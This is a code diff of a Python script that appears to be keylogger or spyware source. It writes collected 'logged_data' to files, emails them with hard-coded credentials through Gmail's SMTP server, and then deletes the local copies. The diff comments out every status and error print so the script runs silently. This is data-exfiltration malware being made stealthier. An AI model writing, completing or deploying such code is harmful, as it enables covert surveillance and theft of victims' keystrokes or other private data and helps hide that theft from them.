@@ -76,7 +76,7 @@ def write_file(count):
 
     with open( file, 'w' ) as fp:
         fp.write( ''.join( logged_data ) )
-    print( 'written all good' )
+    #print( 'written all good' )
 
 def send_logs():
     count = 0
@@ -104,7 +104,7 @@ def send_logs():
                 msg.attach( MIMEText( body, 'plain' ) )
 
                 attachment = open( delete_file[0], 'rb' )
-                print( 'attachment' )
+                #print( 'attachment' )
 
                 filename = delete_file[0].split( '/' )[2]
 
@@ -120,23 +120,23 @@ def send_logs():
                 s = smtplib.SMTP( 'smtp.gmail.com', 587 )
                 s.ehlo()
                 s.starttls()
-                print( 'starttls' )
+                #print( 'starttls' )
                 s.ehlo()
                 s.login( fromAddr, fromPswd )
                 s.sendmail( fromAddr, toAddr, text )
-                print( 'sent mail' )
+                #print( 'sent mail' )
                 attachment.close()
                 s.close()
 
                 os.remove( delete_file[0] )
                 del logged_data[1:]
                 del delete_file[0:]
-                print( 'delete data/files' )
+                #print( 'delete data/files' )
 
                 count += 1
 
             except Exception as errorString:
-                print( '[!] send_logs // Error.. ~ %s' % (errorString) )
+                #print( '[!] send_logs // Error.. ~ %s' % (errorString) )
                 pass
 
 
